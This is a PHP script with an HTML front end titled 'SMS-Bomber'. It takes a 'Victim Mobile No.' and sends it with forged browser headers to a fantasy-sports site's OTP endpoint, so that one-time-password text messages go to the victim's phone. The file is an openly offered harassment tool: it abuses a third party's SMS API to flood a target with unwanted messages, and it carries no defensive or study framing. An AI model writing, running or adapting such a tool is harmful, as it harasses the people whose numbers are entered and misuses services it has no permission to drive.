<?php

if (isset($_POST['no'])) {
    
    
    $no = $_POST["no"];
    $data='{"phoneNo":"'.$no.'","countryAreaCode":"91","language":"English"}';
 $url="https://api.jeet11.com/account-service/external/v1.0.0/sendOtp";
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        
        $headers   = array();
        $headers[] = "Host: api.jeet11.com";
$headers[] = "Content-Length: 68";
$headers[] = "accept:application/json, text/plain, */*";
$headers[] = "user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
$headers[] = "Content-Type: application/json";
$headers[] = "origin:https://www.jeet11.com";
$headers[] = "sec-fetch-site:same-site";
$headers[] = "sec-fetch-mode:cors";
$headers[] = "sec-fetch-dest:empty";

$headers[] = "referer: https://www.jeet11.com/login?redirectAs=%2F&redirectUrl=%2F%3F&";
$headers[] = "accept-encoding:gzip, deflate, br";

$headers[] = "accept-language:en-US,en;q=0.9";
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        $jeson=json_decode($result);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        
        curl_close($ch);
        
    
    echo "<pre>";
print_r($jeson);

print_r($result);
echo "<pre>";
    } 
   
?>


    <!DOCTYPE html>
    <html>

    <head>

        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css?family=Josefin+Sans" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
        <link rel="shortcut icon" type="image/png" href="https://rocketdock.com/images/screenshots/brandSkull.png" />
        <link rel="stylesheet" href="css/style.css">
        <title>
            SMS-Bomber
        </title>
    </head>

    <body>
        <center>
            <h1 style="color:#20c20e">SMS Bombing</h1>
        </center>
        <div class="mainbox">


            <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>" id="submit">
                <div class="cen ">
                    <div id="sqre" class="height">
                        <input type="text" class="in">
                        <input type="number" class="in" name="no" placeholder="Enter Victim Mobile No." required>
                        <div id="cir1">

                        </div>
                        <div id="cir2">

                            <input type="submit" value="  " class="submit">

                            <i class="fas fa-angle-double-right fa-2x"></i>

                        </div>
                    </div>

                </div>
            </form>

        </div>
        
    </body>

    </html>
